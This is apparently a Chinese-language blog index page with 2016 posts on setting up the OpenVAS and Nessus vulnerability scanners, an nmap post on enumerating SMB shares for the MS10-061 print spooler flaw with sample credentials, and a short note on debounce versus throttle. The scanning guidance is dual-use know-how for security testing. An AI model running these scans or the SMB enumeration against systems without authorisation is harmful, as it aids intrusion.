<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta name="description" content="onejustone&apos;s blog">
<meta property="og:type" content="website">
<meta property="og:title" content="onejustone">
<meta property="og:url" content="http://yoursite.com/page/25/index.html">
<meta property="og:site_name" content="onejustone">
<meta property="og:description" content="onejustone&apos;s blog">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="onejustone">
<meta name="twitter:description" content="onejustone&apos;s blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/25/">





  <title>onejustone</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">onejustone</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">--愿你内心有种不灭的火焰，将你与别人区分开来--</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            About
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/30/NEXPOSE/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/30/NEXPOSE/" itemprop="url">NEXPOSE</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-30T20:19:00+08:00">
                2016-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/30/OPENVAS/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/30/OPENVAS/" itemprop="url">OPENVAS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-30T19:29:00+08:00">
                2016-06-30
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x00-OPENVAS-一切皆策略"><a href="#0x00-OPENVAS-一切皆策略" class="headerlink" title="0x00 OPENVAS 一切皆策略"></a>0x00 OPENVAS 一切皆策略</h3><p>Openvas是开源的，是Nessus项目分支，用于管理目标系统的漏洞的同时也可以进行攻击渗透。Kali默认安装，但未配置和启动。</p>
<p>Openvas的更新很快，并且配置比较复杂，基于此，也许Openvas并不为大多数人所知。</p>
<hr>
<h3 id="0X01-Openvas配置"><a href="#0X01-Openvas配置" class="headerlink" title="0X01 Openvas配置"></a>0X01 Openvas配置</h3><p>不幸的是，好像Kali Rolling版本已经没有默认安装Openvas了，需要重新下载:</p>
<h4 id="安装openvas"><a href="#安装openvas" class="headerlink" title="安装openvas"></a>安装openvas</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ apt-get install openvas</span><br></pre></td></tr></table></figure>
<h5 id="然后开始配置Openvas"><a href="#然后开始配置Openvas" class="headerlink" title="然后开始配置Openvas"></a>然后开始配置Openvas</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openvas-setup</span><br></pre></td></tr></table></figure>
<h5 id="检查安装结果"><a href="#检查安装结果" class="headerlink" title="检查安装结果"></a>检查安装结果</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openvas-check-setup</span><br></pre></td></tr></table></figure>
<h5 id="查看当前账号"><a href="#查看当前账号" class="headerlink" title="查看当前账号"></a>查看当前账号</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openvasmd --list-users</span><br></pre></td></tr></table></figure>
<h5 id="修改账号密码"><a href="#修改账号密码" class="headerlink" title="修改账号密码"></a>修改账号密码</h5><p>记住更新完openvas以后一定要记得记住那个密码！！！</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openvas --user=admin --new-password=Password</span><br></pre></td></tr></table></figure>
<h5 id="升级Openvas"><a href="#升级Openvas" class="headerlink" title="升级Openvas"></a>升级Openvas</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ openvas-feed-update</span><br></pre></td></tr></table></figure>
<h5 id="openvas开放的端口"><a href="#openvas开放的端口" class="headerlink" title="openvas开放的端口"></a>openvas开放的端口</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ netstat -pantu | grep 939</span><br></pre></td></tr></table></figure>
<p>其中9390是openvas的manager端口号，9391是openvas第一个默认安装的第一个扫描器的端口号，9392是openvas的web登录界面。</p>
<p>但是有时openvas会加载失败，导致family与NVT加载失败，使用openvas-setup才可以从新打开。</p>
<hr>
<h3 id="0x02-openvas的web页面"><a href="#0x02-openvas的web页面" class="headerlink" title="0x02 openvas的web页面"></a>0x02 openvas的web页面</h3><p>登录openvas web界面:<a href="https://127.0.0.1:9392" target="_blank" rel="noopener">https://127.0.0.1:9392</a><br>值得注意的是，openvas不会随着kali自动启动，所以我们需要每次自行启动openvas服务:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$: /usr/bin/openvas-start</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="Extras-gt-MySetting"><a href="#Extras-gt-MySetting" class="headerlink" title="Extras-&gt;MySetting"></a>Extras-&gt;MySetting</h4><p>这里可以对我们的openvas进行设置。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-92c25a92cc251ff1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="MySetting.png"></p>
<hr>
<h3 id="0x03-OPENVAS-初体验"><a href="#0x03-OPENVAS-初体验" class="headerlink" title="0x03  OPENVAS 初体验"></a>0x03  OPENVAS 初体验</h3><p>使用openvas进行扫描操作之前需要配置扫描策略(Configuration)。</p>
<p>登录openvas界面后选择Configuration菜单下的Scan configs可以看到openvas已经默认集成了多种扫描策略:</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-756f4b34bb0cfe24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Scan configs的默认策略.png"></p>
<ul>
<li><strong>Discover</strong>: 只对目标系统进行发现扫描。</li>
<li><strong>empty</strong>: 空策略，不进行任何操作。</li>
<li><strong>Full and fast:</strong>全面的快速的扫描</li>
<li><strong>Full and fast ulitimate:</strong>全面的快速的极限扫描</li>
<li><strong>Full and very deep:</strong>全面的深度扫描</li>
<li><strong>Full and very deep ultimate:</strong>全面的极限深度扫描</li>
<li><strong>Host Discovery:</strong>主机发现</li>
<li><strong>System Discovery:</strong>系统识别</li>
</ul>
<p>通常情况下我们会选择Full and Fast策略，它的families类型会达到56，NTV数量可以达到40000多个。</p>
<p>当然也可以自定义扫描策略.</p>
<hr>
<h3 id="0x04-Openvas-自定义扫描策略"><a href="#0x04-Openvas-自定义扫描策略" class="headerlink" title="0x04 Openvas 自定义扫描策略"></a>0x04 Openvas 自定义扫描策略</h3><hr>
<h4 id="创建一个只针对windows的扫描策略"><a href="#创建一个只针对windows的扫描策略" class="headerlink" title="创建一个只针对windows的扫描策略"></a>创建一个只针对windows的扫描策略</h4><p>选择菜单栏的星号，可以进行自定义的扫描策略。</p>
<p>进入Confiuration选项点击Scan configs后再点击菜单栏中的星号图标可进行<strong>New Scan Configuration</strong>操作。</p>
<p>然后设置好策略的名称，在<strong>Edit Network Vulnerability Test Families</strong>中\选择需要的<strong>family</strong>\类型，每一个<strong>family</strong>代表一种漏洞类型，该类型下会集成多个<strong>NVTS</strong>。</p>
<p>然后勾选<strong>Selext all NVTs</strong>选项为策略添加该families。</p>
<p>还注意到_Family__旁有斜着(DYNAMIC)和横(STATIC)着的两个箭头，选择DYNAMIC意味着当openvas官方发布该<strong>Family</strong>下新的<strong>NVTS</strong>时，策略会自动添加新的<strong>NVTS</strong>。</p>
<p>由于只是针对windows系统的扫描，所以我们会选择如下的<strong>Families</strong>:</p>
<ul>
<li>Brute force attacks:暴力破解漏洞，该family不仅仅对windows有效，linux同样适用。</li>
<li>Buffer overflow:缓存区溢出漏洞</li>
<li>Compiance</li>
<li>Databse:数据库</li>
<li>Default Accpunts:默认账号</li>
<li>Default Service:默认服务</li>
<li>FTP:</li>
<li>FInger abuses:</li>
<li>Firewall:</li>
<li>Gain a shell rmotely</li>
<li>General</li>
<li>Malware恶意软件</li>
<li>Nmap NSE：NAMP的恶意扫描脚本</li>
<li>Nmap NET NSE</li>
<li>Peer-To-Peer</li>
<li>Policy</li>
<li>Port scanners</li>
<li>Privilege escalation</li>
<li>Production detetion</li>
<li>RPC</li>
<li>SMTP problems</li>
<li>SNMP</li>
<li>Service detection</li>
<li>Settings</li>
<li>Useless services</li>
<li>Web Servers</li>
<li>Web application abuses</li>
<li>Windows</li>
<li>Widows:Microsoft Bulletins</li>
</ul>
<p>选择完毕以后<strong>Save Config</strong>,\回到主界面，可以发现多了一个<strong>window_Server_scanconfig</strong>的配置文件。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-199de9ce4e878a94.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="zhujiemian.png"></p>
<p>以后可以通过<strong>扳手</strong>图标对其进行编辑。</p>
<h5 id="确定要扫描的Targets策略"><a href="#确定要扫描的Targets策略" class="headerlink" title="确定要扫描的Targets策略"></a>确定要扫描的Targets策略</h5><p>选择菜单栏<strong>Configuration</strong>\下的<strong>Targets</strong>\选项，然后点击<strong>星号按钮</strong>进行扫描目标策略配置。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-ca20371739175fd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Targets策略.png"></p>
<p>配置好以后选择<strong>Creat Target</strong>进行保存。</p>
<h5 id="配置端口扫描策略"><a href="#配置端口扫描策略" class="headerlink" title="配置端口扫描策略"></a>配置端口扫描策略</h5><p>同样选择<strong>Configuration</strong>--&gt;<strong>Port List</strong>--&gt;<strong>星号(New Port List)</strong>添加需要扫描的端口号。</p>
<h5 id="Schedule策略"><a href="#Schedule策略" class="headerlink" title="Schedule策略"></a>Schedule策略</h5><p>调度策略可以使用<strong>Task</strong>按Schedule中的规则去执行任务。<br>比如在特定的时间点执行策略，或者每周执行一处策略。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-0c147ffa2801d6da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Schedule.png"></p>
<h5 id="Task策略"><a href="#Task策略" class="headerlink" title="Task策略"></a>Task策略</h5><p>建立Task策略可以自定义执行之前的所有策略。<br>这次讲使用到菜单栏的<strong>Scan Management</strong>\选项下的<strong>Task</strong>。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/1571420-42c3ec570ffa9653.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Targets策略.png"></p>
<p>最后回到Task Manager页面，点击执行按钮开始执行任务。</p>
<p>利用扫描器去扫描也许会得到很多的结果，但是我们该如何去验证这些结果的正确性？这个便是MSF所能做的了。</p>
<h5 id="生成报告"><a href="#生成报告" class="headerlink" title="生成报告"></a>生成报告</h5><p>当扫描完成以后可以讲扫描结果进行特定格式的导出，以方便进行阅读和分析。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/27/NESSUS/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/27/NESSUS/" itemprop="url">NESSUS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-27T16:16:00+08:00">
                2016-06-27
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0X00-前言"><a href="#0X00-前言" class="headerlink" title="0X00 前言"></a>0X00 前言</h3><p>OPENVAS是免费开源的，所以对于用户的是使用体验便不会太尽如人意了。那么与此对应的便是收费版本的NESSUS了，当然NESSUS也有免费版的，而且就弱点扫描这一块来说，NESSUS的商业版和免费版的功能是一样的。</p>
<p>首先进入NESSUS官网下载kali.deb安装包:<a href="http://www.tenable.com/products/nessus/select-your-operating-system#tos" target="_blank" rel="noopener">http://www.tenable.com/products/nessus/select-your-operating-system#tos</a></p>
<hr>
<h3 id="0x01-NESSUS的安装"><a href="#0x01-NESSUS的安装" class="headerlink" title="0x01 NESSUS的安装"></a>0x01 NESSUS的安装</h3><p>安装完成以后得到如下界面:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- You can start Nessus by typing /etc/init.d/nessusd start</span><br><span class="line">- Then go to https://jack:8834/ to configure your scanner</span><br></pre></td></tr></table></figure>
<p>首先启动NESSS:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  /etc/init.d/nessusd start</span><br><span class="line">Starting Nessus : .</span><br><span class="line">➜ /etc/init.d/nessusd status</span><br><span class="line">Nessus is running</span><br></pre></td></tr></table></figure>
<p>然后打开nessus的本地网站:<a href="https://jack:8834/" target="_blank" rel="noopener">https://jack:8834/</a>,<br>填写账号和密码，然后会提示你输入激活码，这时可以进入这个网站:<a href="http://tenable.com/products/nessus-home" target="_blank" rel="noopener">http://tenable.com/products/nessus-home</a> 去获得激活码。</p>
<p>最后得到激活码，开始安装nessus，此过程会比较漫长。。。。</p>
<p>NESSUS的安装目录是在:/opt/nessus/下的。</p>
<hr>
<h3 id="0x02-NESSUS的使用"><a href="#0x02-NESSUS的使用" class="headerlink" title="0x02 NESSUS的使用"></a>0x02 NESSUS的使用</h3><p>等待NESSUS安装完成以后通过访问本地web页面登录nessus:<a href="http://127.0.0.01/8834" target="_blank" rel="noopener">http://127.0.0.01/8834</a></p>
<hr>
<h4 id="Scanner-Templates-扫描模板"><a href="#Scanner-Templates-扫描模板" class="headerlink" title="Scanner Templates 扫描模板"></a>Scanner Templates 扫描模板</h4><p>nessus已经集成了一些扫描模板，UPGRADE是仅仅对于商业版才能使用的。</p>
<hr>
<h4 id="Aavanced-Scan-高级扫描"><a href="#Aavanced-Scan-高级扫描" class="headerlink" title="Aavanced Scan 高级扫描"></a>Aavanced Scan 高级扫描</h4><p>进入Adacande Scan制定一个扫描策略。</p>
<hr>
<h4 id="Basic-Network-Scan"><a href="#Basic-Network-Scan" class="headerlink" title="Basic Network Scan"></a>Basic Network Scan</h4><p>这是一个主机扫描，可以任何操作系统的主机进行扫描。</p>
<hr>
<h3 id="Bash-Shellshocks-Detection"><a href="#Bash-Shellshocks-Detection" class="headerlink" title="Bash Shellshocks Detection"></a>Bash Shellshocks Detection</h3><p>检查破壳应用的一个扫描，破壳是一个linux系统上的漏洞，由于系统环境变量造成的。</p>
<hr>
<h3 id="GHOST-Detection-幽灵病毒"><a href="#GHOST-Detection-幽灵病毒" class="headerlink" title="GHOST Detection 幽灵病毒"></a>GHOST Detection 幽灵病毒</h3><p>关于black c最底层的一个漏洞</p>
<hr>
<h4 id="Web-Application-Tests"><a href="#Web-Application-Tests" class="headerlink" title="Web Application Tests"></a>Web Application Tests</h4><p>网页应用层扫描，NESSUS针对网页应用层的扫描是十分有限的。</p>
<hr>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>针对windows恶意程序扫描。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/23/NMAP之漏洞/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/23/NMAP之漏洞/" itemprop="url">漏洞扫描</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-23T18:16:00+08:00">
                2016-06-23
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="0x00-NMAP之漏洞扫描"><a href="#0x00-NMAP之漏洞扫描" class="headerlink" title="0x00 NMAP之漏洞扫描"></a>0x00 NMAP之漏洞扫描</h3><p>进入nmap的scripts文件夹下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  scripts pwd</span><br><span class="line">/usr/share/nmap/scripts</span><br><span class="line">➜  scripts less script.db| wc -l</span><br><span class="line">527</span><br></pre></td></tr></table></figure></p>
<p>可以看到已经有500多个脚本文件了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  scripts less script.db| grep vuln | wc -l</span><br><span class="line">83</span><br></pre></td></tr></table></figure>
<p>其中有83个是和漏洞攻击/监测有关的。</p>
<hr>
<h4 id="smb-vuln-ms-10-061-nse"><a href="#smb-vuln-ms-10-061-nse" class="headerlink" title="smb-vuln-ms 10-061.nse"></a>smb-vuln-ms 10-061.nse</h4><p>该漏洞是Stuxnet蠕虫利用的4个0day之一，既是著名的震网病毒，美国为了攻击伊朗的核设施而发动的人类历史上第一个数字核武器。</p>
<p>其主要是利用LAMMAN API去枚举目标系统的共享打印机，通过低版本的windows，Print Spooler权限配置不当不当，使得印请求可在系统目录创建文件，执行任意代码。</p>
<p>所以10-061首先会去探测目标是否有共享打印机，然后去探测目标系统共享打印机的名称，最后再去进行攻击。</p>
<p>但若是该脚本没有发现共享打印机呢？那么我们还可以利用Kali中的<strong>smb-enum-shares.nse</strong>脚本去枚举目标系统中的共享打印机。但是存在一种情况是有时需要知道目标的账号和密码才能实现枚举:<strong>smb-enum-shares.nse –script-args=smbuser=admin,smbpassword=pass</strong>。利用该脚本去发现目标是否存在共享打印机，然后再使用10-061去执行特意功能。</p>
<p>其具体使用方式是连接目标系统的445端口。</p>
<p>对目标进行共享枚举检查:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  scripts nmap -445 --script=smb-enum-shares.nse 192.168.1.102 </span><br><span class="line">//登陆目标主机以提高探测精确度： </span><br><span class="line">//--script-args=smbuser=admin,smbpassword=123</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/22/函数防抖和函数节流/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/22/函数防抖和函数节流/" itemprop="url">函数防抖和函数节流</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-22T00:00:00+08:00">
                2016-06-22
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="debounce-vs-throttle"><a href="#debounce-vs-throttle" class="headerlink" title="debounce vs throttle"></a>debounce vs throttle</h3><p><code>防抖（Debounce）</code> 和 <code>节流（throttle)</code> 两者都是用来控制某个函数在一定时间内执行多少次的技巧，两者相似而又不同。</p>
<p>“节流”是限制一个一直在执行的函数的最大执行次数。比如让一个本来要一直执行的函数以最多100毫秒执行一次的频率来执行。节流保证你的函数在一定频率下一直执行。</p>
<p>“去抖”则是等一段时间之后再去调用函数(并且函数此时没有被调用)。“去抖”可以让我们把一个连续的的函数调用”打包”成一个。函数去抖是一种空闲控制。</p>
<blockquote>
<p>requestAnimationFrame: 可以看做是<code>throttle</code>的替代品。当你的函数有很多的动画渲染或者有很多的元素操作时，你想保证动画的流畅性，就需要用到这个。注意：IE9不支持rAF.</p>
</blockquote>
<p><code>throttle</code> 方法在内部就是调用了带有 <code>maxWait</code> 参数的 <code>_.debounce</code> 来实现的，</p>
<p><strong> 两者的区别 </strong>： 虽然在等待时间内函数都不会再执行，但 <code>throttle</code> 在第一次触发后开始计算等待时间，<code>debounce</code> 在最后一次触发之后才计算等待时间（最后一次在等待时间范围内）。</p>
<p>当然，这只是基本思想，之实际的应用中，我们还需要考虑一些其它的情况。</p>
